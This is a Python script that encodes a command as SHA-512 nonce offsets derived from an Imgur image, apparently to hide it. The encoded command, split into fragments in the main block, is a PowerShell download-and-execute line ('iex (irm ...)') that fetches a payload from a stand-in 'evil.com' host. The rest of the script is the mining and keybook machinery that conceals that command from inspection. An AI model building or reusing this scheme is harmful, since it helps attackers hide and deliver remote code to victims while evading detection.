import hashlib
import requests
import re
import json
import os
from concurrent.futures import ProcessPoolExecutor


def get_direct_url(url):
    if "i.imgur.com" in url: return url
    match = re.search(r'imgur\.com/(?:gallery/|a/|r/[^/]+/|)?([a-zA-Z0-9]+)', url)
    if match:
        image_id = match.group(1)
        return f"https://i.imgur.com/{image_id}.jpg"
    return url


def check_nonce_range(seed, target_hex, start_nonce, end_nonce):
    """Worker function: Searching for Hexadecimal patterns."""
    for nonce in range(start_nonce, end_nonce):
        hasher = hashlib.sha512()
        hasher.update(seed + str(nonce).encode())
        res_hash = hasher.hexdigest()

        if target_hex in res_hash:
            return {"nonce": nonce, "offset": res_hash.find(target_hex)}
    return None


def mine_sequence(raw_url, target_list, output_file="keybook.json"):
    direct_url = get_direct_url(raw_url)
    headers = {"Range": "bytes=0-5120", "User-Agent": "Mozilla/5.0"}

    try:
        response = requests.get(direct_url, headers=headers, timeout=15)
        response.raise_for_status()
        seed = response.content
        print(f"[*] Entropy Source: {direct_url}")
    except Exception as e:
        print(f"[!] Error: {e}");
        return None

    keybook = []
    num_workers = os.cpu_count() or 4

    for target in target_list:
        target_hex = target.encode().hex()
        print(f"[*] Mining for: '{target}' (Hex: {target_hex})")

        found, current_start, batch_size = False, 0, 500000
        with ProcessPoolExecutor(max_workers=num_workers) as executor:
            while not found:
                futures = [executor.submit(check_nonce_range, seed, target_hex, current_start + (i * batch_size),
                                           current_start + ((i + 1) * batch_size)) for i in range(num_workers)]
                for future in futures:
                    res = future.result()
                    if res:
                        keybook.append({"t": target, "n": res["nonce"], "o": res["offset"], "l": len(target_hex)})
                        print(f"    [+] Found at nonce {res['nonce']}")
                        found = True
                        break
                current_start += (num_workers * batch_size)

    with open(output_file, 'w') as f:
        json.dump({"u": direct_url, "keys": keybook}, f, indent=4)
    print(f"\n[!] Keybook saved to {output_file}")


if __name__ == '__main__':
    img_url = "https://imgur.com/gallery/day-239-of-posting-calvin-hobbes-comics-every-day-o6z93xo"

    # CHUNKED SEQUENCE: Breaking the URL into 4-character blocks for speed
    command_sequence = [
        "iex", " ", "(", "irm", " ",
        "'htt", "ps:/", "/www", ".evi", "l.co", "m/pa", "yloa", "d'",
        ")"
    ]

    mine_sequence(img_url, command_sequence)